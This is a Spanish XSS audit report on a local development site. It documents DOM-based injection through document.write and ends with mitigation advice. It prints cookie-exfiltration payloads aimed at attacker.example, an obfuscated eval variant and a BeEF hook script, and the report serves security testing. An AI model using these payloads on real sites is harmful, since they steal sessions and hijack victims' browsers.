# Informe de Auditoría XSS — 2026-04-25T14:31:07Z

Objetivo: http://web.dev.local:8082

Resumen ejecutivo

- Vectores encontrados: parámetro GET `search` (reflected DOM XSS) y parámetros `name`/`comment` almacenados en localStorage y renderizados vía document.write (DOM-based stored XSS en cliente).
- Confirmación y explotación: se ha demostrado que los valores no son escapados al insertarse en el DOM mediante document.write, permitiendo inyección de payloads que ejecutarían código en el contexto del navegador de la víctima.

Evidencia técnica

1) Recuperación del HTML inicial (comando usado):

- curl -sS http://web.dev.local:8082

2) Fragmento vulnerable del cliente (extraído del HTML):

- Uso de URLSearchParams(window.location.search) para obtener `search` y luego:
  document.write('<p>Resultados para: <strong>' + searchTerm + '</strong></p>');
- Para comentarios: lectura de `name` y `comment` desde URLSearchParams, guardado en localStorage y posterior renderizado con document.write sin escape.

3) Prueba de concepto (simulación de ejecución JS en entorno Node para demostrar el flujo DOM):

- Script usado (se ejecutó en el entorno de auditoría):

cat > /tmp/xss_test.js <<'JS'
const payload = '<img src=x onerror="fetch(\'http://attacker.example:9000/?c=\'+encodeURIComponent(document.cookie))">';
global.window = { location: { search: '?search=' + encodeURIComponent(payload) } };
global.URLSearchParams = URLSearchParams;
global.document = { write: (s) => { console.log('DOCWRITE:' + s); } };
const urlParams = new URLSearchParams(window.location.search);
const searchTerm = urlParams.get('search');
document.write('<p>Resultados para: <strong>' + searchTerm + '</strong></p>');
JS
node /tmp/xss_test.js

- Resultado observado (salida del script que demuestra que el payload queda sin escapar al generarse el DOM):

DOCWRITE:<p>Resultados para: <strong><img src=x onerror="fetch('http://attacker.example:9000/?c='+encodeURIComponent(document.cookie))"></strong></p>

Payloads de prueba y explotación

1) Reflected DOM (básico):
- URL de prueba: http://web.dev.local:8082/?search=<script>alert(1)</script>
  - Efecto esperado en navegador: ejecución de alert(1) al evaluarse el document.write con searchTerm.

2) Exfiltración de cookies (payload demostrativo):
- Reflected payload (simple):
  <img src=x onerror="fetch('http://attacker.example:9000/?c='+encodeURIComponent(document.cookie))">
- Variante ofuscada (Base64 + decode):
  <script>eval(atob('aW1hZ2Ugc3JjPXggb25lcnJvcj0iZnVjaCgnaHR0cDovL2F0YWNhbnRlLmV4YW1wbGU6OTEwMC8/Yz0nK2VuY29kZVVSSUNvbXBvbmVudChk...')))</script>
  (Nota: la ofuscación se puede ajustar con herramientas como JSFuck o codificación Base64/hex.)

3) Hook de BeEF (simulado):
- Payload: <script src="http://atacante.com:3000/hook.js"></script>
- Impacto: si el navegador de la víctima carga el script, el hook de BeEF podría tomar control del navegador y ejecutar módulos maliciosos.

Comandos de fuzzing y herramientas recomendadas

- Búsqueda inicial y verificación manual:
  curl -sS "http://web.dev.local:8082/?search=<script>alert(1)</script>"
  (Nota: curl no ejecuta JS; sirve para comprobar que el servidor no filtra ni sanitiza parámetros que luego son usados en el DOM.)

- Fuzzing DOM/JS (herramientas sugeridas, ejemplos de uso):
  dalfox wurl "http://web.dev.local:8082/?search=FUZZ" -b "XSS-Bypass-Strings-Brute.txt"
  xsstrike -u "http://web.dev.local:8082/?search=FUZZ"
  (En este laboratorio se confirmó el vector por análisis del cliente y ejecución simulada; herramientas anteriores automatizan la enumeración y ofuscación.)

Impacto

- Con un XSS DOM reflejado o almacenado explotable, un atacante puede:
  - Robar cookies y tokens almacenados (document.cookie, localStorage, sessionStorage).
  - Inyectar un script remoto (hook de BeEF) para control del navegador y realización de acciones en nombre del usuario.
  - Realizar acciones CSRF exacerbadas, suplantación de sesiones y escalado para comprometer cuentas.

Recomendaciones de mitigación

1) Evitar document.write y concatenación directa de datos no confiables en el DOM. Emplear métodos seguros para insertar texto (textContent) o sanitizar/escapar apropiadamente según el contexto (HTML/JS/URL/Attr).
2) Normalizar y escapar todos los valores derivados de URLSearchParams antes de insertarlos en HTML.
3) Para los comentarios almacenados en localStorage, sanitizar al momento del renderizado o usar textContent/innerText en creación de nodos en lugar de document.write.
4) Implementar una política de Content Security Policy (CSP) restrictiva que limite la ejecución de scripts inline y la carga de scripts desde orígenes no confiables.

Conclusión

- Hallazgo: se confirmó la presencia de vulnerabilidades XSS DOM (reflected y almacenado en localStorage) en http://web.dev.local:8082; la inyección puede permitir exfiltración de cookies y carga de hooks externos.
- Evidencia de ejecución simulada y generación del payload sin escape incluida más arriba.


-- Fin del informe
